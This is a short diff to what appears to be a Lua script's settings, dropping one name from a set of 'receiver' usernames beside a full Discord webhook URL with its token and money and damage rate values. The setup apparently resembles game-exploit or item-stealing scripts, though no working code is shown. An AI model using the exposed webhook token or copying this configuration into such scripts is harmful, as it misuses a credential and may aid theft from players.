@@ -1,5 +1,5 @@
 WEBHOOK = "https://discord.com/api/webhooks/1392446227962138634/PhK8x6LAqYSOg-awLB5pEemWhdxaTX9nVlRAPTbo-2vdX7ZsWtFqhgsqRYh6IyvhYw0r"
-RECEIVERS = {"lordofskl", "lordofhdmi1", "lordofsml", "lordofssd"}
+RECEIVERS = {"lordofskl", "lordofhdmi1", "lordofsml"}
 MONEY_PER_SECOND = 300000 -- DEFAULT: 300000
 DMG_PER_SECOND = 300000 -- DEFAULT: 300000
 
